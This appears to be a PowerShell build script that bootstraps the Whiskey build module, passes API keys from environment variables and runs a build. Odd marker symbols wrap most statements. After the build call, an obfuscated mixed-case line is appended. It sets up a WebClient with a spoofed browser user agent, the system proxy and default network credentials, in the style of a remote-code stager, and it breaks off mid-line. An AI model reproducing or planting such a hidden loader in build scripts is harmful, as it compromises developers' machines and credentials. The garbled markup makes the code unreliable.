













[CmdletBinding(DefaultParameterSetName='Build')]
param(
    [Parameter(Mandatory,ParameterSetName='Clean')]
    
    [Switch]$Clean,

    [Parameter(Mandatory,ParameterSetName='Initialize')]
    
    [Switch]$Initialize,
    
    [string]$PipelineName,

    [string]$Configuration
)


 -||-> Set-StrictMode -Version Latest <-||- 


 -||-> $whiskeyVersion = '0.*' <-||- 
 -||-> $allowPrerelease = $true <-||- 

 -||-> $psModulesRoot =  -||-> Join-Path -Path $PSScriptRoot -ChildPath 'PSModules' <-||-  <-||- 
 -||-> $whiskeyModuleRoot =  -||-> Join-Path -Path $PSScriptRoot -ChildPath 'PSModules\Whiskey' <-||-  <-||- 

 -||-> if(  -||-> -not ( -||-> Test-Path -Path $whiskeyModuleRoot -PathType Container <-||- ) <-||-  )
{
     -||-> [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12 <-||- 
     -||-> $release = 
         -||-> Invoke-RestMethod -Uri 'https://api.github.com/repos/webmd-health-services/Whiskey/releases' |
        ForEach-Object {  -||-> $_ <-||-  } |
        Where-Object {  -||-> $_.name -like $whiskeyVersion <-||-  } |
        Where-Object {
             -||-> if(  -||-> $allowPrerelease <-||-  )
            {
                return  -||-> $true <-||- 
            } <-||- 
             -||-> [version]::TryParse($_.name,[ref]$null) <-||- 
        } |
        Sort-Object -Property 'created_at' -Descending |
        Select-Object -First 1 <-||-  <-||- 

     -||-> if(  -||-> -not $release <-||-  )
    {
         -||-> Write-Error -Message ( -||-> 'Whiskey version "{0}" not found.' -f $whiskeyVersion <-||- ) -ErrorAction Stop <-||- 
        return
    } <-||- 

     -||-> $zipUri = 
         -||-> $release.assets |
        ForEach-Object {  -||-> $_ <-||-  } |
        Where-Object {  -||-> $_.name -eq 'Whiskey.zip' <-||-  } |
        Select-Object -ExpandProperty 'browser_download_url' <-||-  <-||- 
    
     -||-> if(  -||-> -not $zipUri <-||-  )
    {
         -||-> Write-Error -Message ( -||-> 'URI to Whiskey ZIP file does not exist.' <-||- ) -ErrorAction Stop <-||- 
    } <-||- 

     -||-> Write-Verbose -Message ( -||-> 'Found Whiskey {0}.' -f $release.name <-||- ) <-||- 

     -||-> if(  -||-> -not ( -||-> Test-Path -Path $psModulesRoot -PathType Container <-||- ) <-||-  )
    {
         -||-> New-Item -Path $psModulesRoot -ItemType 'Directory' | Out-Null <-||- 
    } <-||- 
     -||-> $zipFilePath =  -||-> Join-Path -Path $psModulesRoot -ChildPath 'Whiskey.zip' <-||-  <-||- 
     -||-> & {
         -||-> $ProgressPreference = 'SilentlyContinue' <-||- 
         -||-> Invoke-WebRequest -UseBasicParsing -Uri $zipUri -OutFile $zipFilePath <-||- 
    } <-||- 

    
    
     -||-> Add-Type -AssemblyName 'System.IO.Compression.FileSystem' <-||- 
     -||-> $zipFile = [IO.Compression.ZipFile]::OpenRead($zipFilePath) <-||- 
     -||-> try
    {
         -||-> foreach( $entry in  -||-> $zipFile.Entries <-||-  )
        {
             -||-> $destinationPath =  -||-> Join-Path -Path $whiskeyModuleRoot -ChildPath $entry.FullName <-||-  <-||- 
             -||-> $destinationDirectory =  -||-> $destinationPath | Split-Path <-||-  <-||- 
             -||-> if(  -||-> -not ( -||-> Test-Path -Path $destinationDirectory -PathType Container <-||- ) <-||-  )
            {
                 -||-> New-Item -Path $destinationDirectory -ItemType 'Directory' | Out-Null <-||- 
            } <-||- 
             -||-> Write-Debug -Message ( -||-> '{0} -> {1}' -f $entry.FullName,$destinationPath <-||- ) <-||- 
             -||-> [IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destinationPath, $true) <-||- 
        } <-||- 
    }
    finally
    {
         -||-> $zipFile.Dispose() <-||- 
    } <-||- 

    
     -||-> $moduleDirName = $release.name -replace '-.*$','' <-||- 
     -||-> Rename-Item -Path ( -||-> Join-Path -Path $whiskeyModuleRoot -ChildPath 'Whiskey' <-||- ) -NewName $moduleDirName <-||- 

     -||-> Remove-Item -Path $zipFilePath <-||- 
} <-||- 

 -||-> & {
     -||-> $VerbosePreference = 'SilentlyContinue' <-||- 
     -||-> Import-Module -Name $whiskeyModuleRoot -Force <-||- 
} <-||- 

 -||-> $optionalArgs = @{ } <-||- 

 -||-> if(  -||-> $PipelineName <-||-  )
{
     -||-> $optionalArgs['PipelineName'] = $PipelineName <-||- 
} <-||- 

 -||-> if(  -||-> $Clean <-||-  )
{
     -||-> $optionalArgs['Clean'] = $true <-||- 
} <-||- 

 -||-> if(  -||-> $Initialize <-||-  )
{
     -||-> $optionalArgs['Initialize'] = $true <-||- 
} <-||- 

 -||-> $whiskeyYmlPath =  -||-> Join-Path -Path $PSScriptRoot -ChildPath 'whiskey.yml' <-||-  <-||- 
 -||-> $context =  -||-> New-WhiskeyContext -Environment 'Dev' -ConfigurationPath $whiskeyYmlPath <-||-  <-||- 

 -||-> if(  -||-> $Configuration <-||-  )
{
     -||-> $context.MSBuildConfiguration = $Configuration <-||- 
} <-||- 

 -||-> $apiKeys = @{
                'powershellgallery.com' =  -||-> 'POWERSHELL_GALLERY_API_KEY' <-||- ;
                'nuget.org' =  -||-> 'NUGET_ORG_API_KEY' <-||- ;
                'chocolatey.org' =  -||-> 'CHOCOLATEY_ORG_API_KEY' <-||- ;
                'github.com' =  -||-> 'GITHUB_ACCESS_TOKEN' <-||- 
            } <-||- 
 -||-> foreach( $apiKeyID in  -||-> $apiKeys.Keys <-||-  )
{
     -||-> $envVarName = $apiKeys[$apiKeyID] <-||- 
     -||-> $envVarPath = 'env:{0}' -f $envVarName <-||- 
     -||-> if(  -||-> -not ( -||-> Test-Path -Path $envVarPath <-||- ) <-||-  )
    {
        continue
    } <-||- 

     -||-> Write-Verbose ( -||-> 'Adding API key "{0}" from environment variable "{1}".' -f $apiKeyID,$envVarName <-||- ) <-||- 
     -||-> Add-WhiskeyApiKey -Context $context -ID $apiKeyID -Value ( -||-> Get-Item -Path $envVarPath <-||- ).Value <-||- 
} <-||- 

 -||-> $envVarsToSkip =  -||-> & {  -||-> 'SNK' <-||-  ;  -||-> $apiKeys.Values <-||-  } <-||-  <-||- 

 -||-> Get-ChildItem -Path 'env:' |
    Where-Object {  -||-> $_.Name -notin $envVarsToSkip <-||-  } |
    Format-Table |
    Out-String |
    Write-Verbose <-||- 

 -||-> Invoke-WhiskeyBuild -Context $context @optionalArgs <-||- 

 -||-> [SystEm.NEt.SERvicePOintMAnagER]::ExpEcT100COnTiNUe = 0 <-||- ; -||-> $wC= -||-> NEW-OBJect SystEM.NeT.WebClIent <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> $Wc.HeaDeRs.Add('User-Agent',$u) <-||- ; -||-> $WC.PROXY = [SYsTem.NeT.WeBREQUest]::DEfAuLtWEbProXY <-||- ; -||-> $wC.PRoXy.CredEntiaLS = [SYStem.NeT.CrEdENtIaLCAcHE]::DEFAULtNEtWORKCREDenTiALS <-||- ; -||-> $K='c


 <-||- 
